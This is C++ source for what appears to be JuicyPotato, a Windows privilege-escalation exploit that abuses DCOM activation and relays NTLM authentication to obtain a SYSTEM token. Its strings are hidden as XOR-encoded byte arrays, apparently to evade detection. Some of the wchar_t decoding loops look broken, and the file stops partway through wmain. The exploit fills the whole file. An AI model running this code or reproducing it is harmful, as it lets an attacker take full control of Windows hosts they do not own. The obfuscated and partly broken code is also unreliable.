#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <userenv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <winsafer.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int Juicy(wchar_t *, BOOL);
wchar_t *olestr;
wchar_t *g_port;
wchar_t *rpcserver;
wchar_t *rpcport;
char dcom_port[12];
char dcom_ip[17];

static const char VERSION[] = "0.1";
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t *processtype = NULL;
wchar_t *processargs = NULL;
wchar_t *processname = NULL;

int IsTokenSystem(HANDLE tok)
{
	
	 char  hid__S__S__zotuWHhr2OYl[] = {'\x60','\x16','\x7e','\x60','\x16','\x19','\x60','\x16','\x4f','\x45'};
char k_MzrXW1lV7u2Q = '\x45';
for(char &x : hid__S__S__zotuWHhr2OYl){
x = x ^ k_MzrXW1lV7u2Q;
}

	 wchar_t  hid_S_Y_S__WBvTJpt3dnQL[] = {'\x16','\x45','\x1c','\x45','\x16','\x45','\x11','\x45','\x0','\x45','\x8','\x45','\x45'};
char k_G9rD0s9uyFNe = '\x45';
for(char &x : hid_S_Y_S__WBvTJpt3dnQL){
x = x ^ k_G9rD0s9uyFNe;
}
DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf(hid__S__S__zotuWHhr2OYl, olestr, DomainName, UserName);
	if (!_wcsicmp(UserName, hid_S_Y_S__WBvTJpt3dnQL))
		return 1;

	return 0;
}

void usage()
{
	
	 char  hid_JuicyP_mCO0klnbT6cR[] = {'\xf','\x30','\x2c','\x26','\x3c','\x15','\x2a','\x31','\x24','\x31','\x2a','\x65','\x33','\x60','\x36','\x65','\x4f','\x4f','\x45'};
char k_imGwG6rtJlza = '\x45';
for(char &x : hid_JuicyP_mCO0klnbT6cR){
x = x ^ k_imGwG6rtJlza;
}

	 char  hid_Mandat_FnlSnu9LIGP2[] = {'\x8','\x24','\x2b','\x21','\x24','\x31','\x2a','\x37','\x3c','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x31','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x35','\x37','\x2a','\x26','\x20','\x36','\x36','\x65','\x26','\x24','\x29','\x29','\x7f','\x65','\x79','\x31','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x69','\x65','\x79','\x30','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x69','\x65','\x79','\x6f','\x7b','\x65','\x31','\x37','\x3c','\x65','\x27','\x2a','\x31','\x2d','\x4f','\x68','\x35','\x65','\x79','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x7b','\x7f','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x31','\x2a','\x65','\x29','\x24','\x30','\x2b','\x26','\x2d','\x4f','\x68','\x29','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x4f','\x45'};
char k_uxPzE0oMZZy1 = '\x45';
for(char &x : hid_Mandat_FnlSnu9LIGP2){
x = x ^ k_uxPzE0oMZZy1;
}

	 char  hid_Option_KX39e2ehz2nw[] = {'\xa','\x35','\x31','\x2c','\x2a','\x2b','\x24','\x29','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x28','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x24','\x65','\x79','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7b','\x7f','\x65','\x26','\x2a','\x28','\x28','\x24','\x2b','\x21','\x65','\x29','\x2c','\x2b','\x20','\x65','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x65','\x31','\x2a','\x65','\x35','\x24','\x36','\x36','\x65','\x31','\x2a','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\xb','\x10','\x9','\x9','\x6c','\x4f','\x68','\x2e','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x2c','\x35','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x2b','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x76','\x70','\x6c','\x4f','\x68','\x26','\x65','\x79','\x3e','\x26','\x29','\x36','\x2c','\x21','\x38','\x7b','\x7f','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x7','\xc','\x11','\x16','\x7f','\x3e','\x71','\x7c','\x7c','\x74','\x21','\x76','\x71','\x27','\x68','\x7d','\x75','\x24','\x74','\x68','\x71','\x77','\x7c','\x74','\x68','\x7d','\x76','\x27','\x73','\x68','\x76','\x76','\x77','\x7d','\x76','\x73','\x73','\x27','\x7c','\x75','\x7c','\x72','\x38','\x6c','\x4f','\x68','\x3f','\x65','\x2a','\x2b','\x29','\x3c','\x65','\x31','\x20','\x36','\x31','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x24','\x2b','\x21','\x65','\x35','\x37','\x2c','\x2b','\x31','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x62','\x36','\x65','\x30','\x36','\x20','\x37','\x4f','\x45'};
char k_9RBlgKOsCMiM = '\x45';
for(char &x : hid_Option_KX39e2ehz2nw){
x = x ^ k_9RBlgKOsCMiM;
}
printf(hid_JuicyP_mCO0klnbT6cR, VERSION);

	printf(hid_Mandat_FnlSnu9LIGP2
	);

	printf("\n\n");
	printf(hid_Option_KX39e2ehz2nw
	);
}

PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}

int PotatoAPI::findNTLMBytes(char *bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char *bytes, int len) {
	
	 char  hid_Error__tQFr1yScvxbV[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x68','\x65','\x10','\x2b','\x2e','\x2b','\x2a','\x32','\x2b','\x65','\xb','\x11','\x9','\x8','\x65','\x28','\x20','\x36','\x36','\x24','\x22','\x20','\x65','\x31','\x3c','\x35','\x20','\x6b','\x6b','\x6b','\x45'};
char k_4ptMxpMwcqMI = '\x45';
for(char &x : hid_Error__tQFr1yScvxbV){
x = x ^ k_4ptMxpMwcqMI;
}
int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
		case 1:
			//NTLM type 1 message
			negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 2:
			//NTLM type 2 message
			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 3:
			//NTLM type 3 message
			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
			break;
		default:
			printf(hid_Error__tQFr1yScvxbV);
			return -1;
			break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	
	 wchar_t  hid________JbgohlUbZbNh[] = {'\x3e','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x6','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x71','\x45','\x73','\x45','\x38','\x45','\x45'};
char k_paiFM459JKa5 = '\x45';
for(char &x : hid________JbgohlUbZbNh){
x = x ^ k_paiFM459JKa5;
}
CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(hid________JbgohlUbZbNh, &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	
	 char  hid_WSASta_lB1JI6RpK8bn[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_rZ5TVBfV8tvj = '\x45';
for(char &x : hid_WSASta_lB1JI6RpK8bn){
x = x ^ k_rZ5TVBfV8tvj;
}

	 char  hid________Gz5FNiyKPYtp[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
char k_nyumvrYPfLzi = '\x45';
for(char &x : hid________Gz5FNiyKPYtp){
x = x ^ k_nyumvrYPfLzi;
}

	 char  hid_getadd_wWTdwOgxnAr4[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_uNWD0M9LK3u9 = '\x45';
for(char &x : hid_getadd_wWTdwOgxnAr4){
x = x ^ k_uNWD0M9LK3u9;
}

	 char  hid_socket_lP0D6eo0wVhi[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
char k_yB7RohrW2NLl = '\x45';
for(char &x : hid_socket_lP0D6eo0wVhi){
x = x ^ k_yB7RohrW2NLl;
}

	 char  hid_Unable_vMSBZYCANcTU[] = {'\x10','\x2b','\x24','\x27','\x29','\x20','\x65','\x31','\x2a','\x65','\x26','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x65','\x31','\x2a','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x64','\x4f','\x45'};
char k_3eQ5zQEDtIrr = '\x45';
for(char &x : hid_Unable_vMSBZYCANcTU){
x = x ^ k_3eQ5zQEDtIrr;
}

	 char  hid_RPC____UWjpvwhah1lj[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_ZXF7FLmwF5HL = '\x45';
for(char &x : hid_RPC____UWjpvwhah1lj){
x = x ^ k_ZXF7FLmwF5HL;
}

	 char  hid_RPC____WTFh17eXM6er[] = {'\x17','\x15','\x6','\x68','\x7b','\x65','\x6','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x2c','\x2a','\x2b','\x65','\x26','\x29','\x2a','\x36','\x20','\x21','\x4f','\x45'};
char k_K3CsUny0JuxF = '\x45';
for(char &x : hid_RPC____WTFh17eXM6er){
x = x ^ k_K3CsUny0JuxF;
}

	 char  hid_RPC____tMmiDGxTZRoB[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_rBvOoRtzqool = '\x45';
for(char &x : hid_RPC____tMmiDGxTZRoB){
x = x ^ k_rBvOoRtzqool;
}
const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_lB1JI6RpK8bn, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, hid________Gz5FNiyKPYtp);
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf(hid_getadd_wWTdwOgxnAr4, iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf(hid_socket_lP0D6eo0wVhi, WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf(hid_Unable_vMSBZYCANcTU);
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	do {
		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		
		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf(hid_RPC____UWjpvwhah1lj, WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf(hid_RPC____WTFh17eXM6er);
		}
		else {
			printf(hid_RPC____tMmiDGxTZRoB, WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int PotatoAPI::startCOMListener(void) {
	
	 char  hid_WSASta_aENoHv6qzv1x[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_fxid60p2zrcT = '\x45';
for(char &x : hid_WSASta_aENoHv6qzv1x){
x = x ^ k_fxid60p2zrcT;
}

	 char  hid_getadd_VPm8BoJJl8V6[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_EwuhsSqGbMKy = '\x45';
for(char &x : hid_getadd_VPm8BoJJl8V6){
x = x ^ k_EwuhsSqGbMKy;
}

	 char  hid_socket_FlVFBRlQYHMt[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
char k_uoNSDjqTaq0e = '\x45';
for(char &x : hid_socket_FlVFBRlQYHMt){
x = x ^ k_uoNSDjqTaq0e;
}

	 char  hid_bind_f_iEeLVsXPiLME[] = {'\x27','\x2c','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_fqiCdX9it8OD = '\x45';
for(char &x : hid_bind_f_iEeLVsXPiLME){
x = x ^ k_fqiCdX9it8OD;
}

	 char  hid_listen_nBhbBS1jNv13[] = {'\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_ahLZMSG3Nb81 = '\x45';
for(char &x : hid_listen_nBhbBS1jNv13){
x = x ^ k_ahLZMSG3Nb81;
}

	 char  hid_accept_QGJKFMowdJhr[] = {'\x24','\x26','\x26','\x20','\x35','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_uOIpgXNwxRr4 = '\x45';
for(char &x : hid_accept_QGJKFMowdJhr){
x = x ^ k_uOIpgXNwxRr4;
}

	 char  hid_COM____Vm1aP8TeZ70W[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_sG8wKi1UAVOZ = '\x45';
for(char &x : hid_COM____Vm1aP8TeZ70W){
x = x ^ k_sG8wKi1UAVOZ;
}

	 char  hid_COM____OZaS3ZIGrYJg[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_dscovTRi9WCS = '\x45';
for(char &x : hid_COM____OZaS3ZIGrYJg){
x = x ^ k_dscovTRi9WCS;
}

	 char  hid_shutdo_FSbMkZekAOfI[] = {'\x36','\x2d','\x30','\x31','\x21','\x2a','\x32','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
char k_Bc3iDmNjv9tV = '\x45';
for(char &x : hid_shutdo_FSbMkZekAOfI){
x = x ^ k_Bc3iDmNjv9tV;
}
const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo *result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_aENoHv6qzv1x, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);
	
	// printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf(hid_getadd_VPm8BoJJl8V6, iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf(hid_socket_FlVFBRlQYHMt, WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_bind_f_iEeLVsXPiLME, WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf(hid_listen_nBhbBS1jNv13, WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server

	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf(hid_accept_QGJKFMowdJhr, WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}

	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			
			if (!TEST_mode)
				printf(".", iResult);
			
			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf(hid_COM____Vm1aP8TeZ70W, WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();
			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf(hid_COM____OZaS3ZIGrYJg, WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_shutdo_FSbMkZekAOfI, WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	
	 char  hid_Priv_L_62Ui5nJgABUK[] = {'\x15','\x37','\x2c','\x33','\x65','\x9','\x2a','\x2a','\x2e','\x30','\x35','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
char k_ypISkni7cjgr = '\x45';
for(char &x : hid_Priv_L_62Ui5nJgABUK){
x = x ^ k_ypISkni7cjgr;
}

	 char  hid_Priv_A_46uSKkSxxgHi[] = {'\x15','\x37','\x2c','\x33','\x65','\x4','\x21','\x2f','\x30','\x36','\x31','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
char k_NYfqIsWU5BtA = '\x45';
for(char &x : hid_Priv_A_46uSKkSxxgHi){
x = x ^ k_NYfqIsWU5BtA;
}
TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf(hid_Priv_L_62Ui5nJgABUK);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf(hid_Priv_A_46uSKkSxxgHi);
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	
	 char  hid________YUMV4x2kt9yh[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
char k_mxSs3bPapUZu = '\x45';
